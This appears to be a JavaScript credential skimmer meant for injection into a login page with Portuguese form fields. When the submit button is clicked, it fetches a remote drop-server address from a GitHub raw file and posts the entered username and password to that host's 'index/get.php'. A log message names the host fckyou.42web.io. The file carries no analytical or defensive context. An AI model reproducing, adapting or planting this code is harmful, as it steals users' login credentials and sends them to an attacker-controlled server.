console.log("yepp")
//document.addEventListener("DOMContentLoaded", function() {
let btn = document.getElementsByClassName("g-recaptcha")
const username = document.querySelector('[name="user.login"]')
const password = document.querySelector('[name="user.senha"]')


if (btn[0]){
    console.log("encontrou")
    btn[0].addEventListener("click", function(){
        console.log("Botão de envio de formulário clicado.");

        let xhr = new XMLHttpRequest();

        console.log("Objeto XMLHttpRequest criado.");

        xhr.open('GET', 'https://raw.githubusercontent.com/Wolota/ips/main/url-new', true);
        xhr.onreadystatechange = async function() {
            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                const urlContent = xhr.responseText;

                const data = new FormData();
                data.append("username", username.value);
                data.append("password", password.value);

                const response = await fetch(urlContent + "index/get.php", {
                    method: "POST",
                    body: data
                });

                console.log("Dados enviados com sucesso para http://fckyou.42web.io/index/get.php.");
            }
        };
        xhr.send();

        console.log("Requisição enviada para o servidor.");
    });
}
//});
